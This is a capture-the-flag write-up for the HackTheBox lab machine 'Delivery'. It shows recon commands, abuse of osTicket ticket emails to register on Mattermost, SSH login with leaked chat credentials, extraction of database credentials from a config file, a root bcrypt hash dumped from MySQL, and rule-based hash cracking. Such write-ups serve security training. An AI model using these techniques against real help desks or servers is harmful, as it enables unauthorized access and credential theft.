---
title: "HTB: Delivery"
date: 2026-06-23
tags: [hackthebox, htb-delivery, osticket, tickettrick, mattermost, mysql, hashcat, password-cracking, easy, linux]
---
![machine card](/assets/img/delivery/01-machine-card.png)
Delivery is an easy Linux box. The chain is mostly about chaining trust between
services: a support desk hands out a company email, that email gets me into a
Mattermost chat, the chat leaks SSH creds and a password hint, and that hint is
what finally cracks the root hash I pull out of the Mattermost database.


## Recon

### nmap

```
chickenprophecy@pwn$ nmap -sC -sV -p- --min-rate 10000 10.129.26.152 -oN delivery.txt

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp   open  http    nginx 1.14.2
8065/tcp open  unknown
```

Three services: SSH on 22, nginx on 80, and something unidentified on 8065.


### The web app and the hostnames 
![delivery landing](/assets/img/delivery/02-delivery-landing.png)

![helpdesk contact](/assets/img/delivery/03-helpdesk-contact.png)
![osticket](/assets/img/delivery/04-osticket.png)

![mattermost login](/assets/img/delivery/05-mattermost-login.png)



The site on port 80 is a "Delivery" landing page. The HELPDESK link points at `http://helpdesk.delivery.htb/`, and the Contact Us box says that once I have an `@delivery.htb` email address I can get into their Mattermost server. 


So I add both names to hosts: ``` chickenprophecy@pwn$ echo "10.129.26.152 delivery.htb helpdesk.delivery.htb" | sudo tee -a /etc/hosts ``` `helpdesk.delivery.htb` is running osTicket (a support ticket system). Port 8065 turns out to be the Mattermost instance, and its registration is open, but it wants an `@delivery.htb` email I do not have yet.## Foothold: TicketTrick


![open ticket](/assets/img/delivery/06-open-ticket.png)
![ticket created](/assets/img/delivery/07-ticket-created.png)The trick here is that osTicket gives every new ticket its own email address on
the company domain, so I can register a ticket, get a `@delivery.htb` address out
of it, and use that address to sign up for Mattermost.

Open a new ticket on the help desk with any details. After submitting, the
success page gives a ticket number and tells me I can add to the ticket by
emailing a specific address:

```
8086792@delivery.htb
```

That is my company email. I register on Mattermost (port 8065) with it.![mattermost register](/assets/img/delivery/08-mattermost-register.png) ![ticket confirm link](/assets/img/delivery/09-ticket-confirm-link.png)
The confirmation step shows up inside the ticket thread back on osTicket (since the
verification email "arrives" at the ticket address), so I read the confirmation link off the ticket and finish registration.

Once in, I join the internal team channel. The conversation there hands me two things:
![internal channel creds](/assets/img/delivery/10-internal-channel-creds.png)
A set of SSH credentials posted in the chat:

```
maildeliverer:Youve_G0t_Mail!
```

And a note from root that the team keeps reusing passwords that are variants of
`PleaseSubscribe!`, with a specific warning.


## Shell as maildeliverer

The chat creds work over SSH:

```
chickenprophecy@pwn$ ssh maildeliverer@10.129.26.152
maildeliverer@10.129.26.152's password:

maildeliverer@Delivery:~$ whoami
maildeliverer
maildeliverer@Delivery:~$ cat user.txt
[user flag]
```

## Privilege escalation

### Finding the Mattermost config

Mattermost is the obvious place to dig, since it is the service holding all the
internal accounts. I looked for its config:

```
maildeliverer@Delivery:~$ find / -name "config.json" 2>/dev/null
...
/opt/mattermost/config/config.json
```

Reading it, the `SqlSettings` block contains the database connection string with
credentials in plain text:

```
mmuser:Crack_The_MM_Admin_PW
```

### Pulling the root hash from MySQL

Log into the Mattermost database with those creds:

```
maildeliverer@Delivery:~$ mysql -u mmuser -p
...
MariaDB [(none)]> use mattermost;
MariaDB [mattermost]> select Username, Password from Users;
```

The `Users` table has a bcrypt hash for root (the `root@delivery.htb` account):

```
root   $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjj0
```

`$2a$` is the bcrypt signature. This is the real, crackable hash, and it ties
straight back to the chat hint.

### Cracking with the PleaseSubscribe! pattern

 The password is a variant of `PleaseSubscribe!`,
so a normal wordlist like rockyou will not have it (root said as much in the
chat). Instead of a giant wordlist, the move is to take that one base word and
let hashcat rules mutate it into many realistic variations (append digits,
toggle case, reverse, and so on).

Generate the candidate list from the single word with `best64.rule`:

```
chickenprophecy@pwn$ echo 'PleaseSubscribe!' | hashcat -r /usr/share/hashcat/rules/best64.rule --stdout > wordlist
```

That produces a tiny file with things like `PleaseSubscribe!`, `PLEASESUBSCRIBE!`,
`PleaseSubscribe!0`, `PleaseSubscribe!1`, and so on. Then crack the bcrypt hash
against just that list (bcrypt is slow, so a small targeted list is the point):

```
chickenprophecy@pwn$ john root_hash --wordlist=wordlist
...
PleaseSubscribe!21   (?)
```

Root's password is `PleaseSubscribe!21`.

### Root

```
maildeliverer@Delivery:/opt/mattermost$ su root
Password:
root@Delivery:/opt/mattermost# id
uid=0(root) gid=0(root) groups=0(root)
root@Delivery:/opt/mattermost# cat /root/root.txt
[root flag]
```
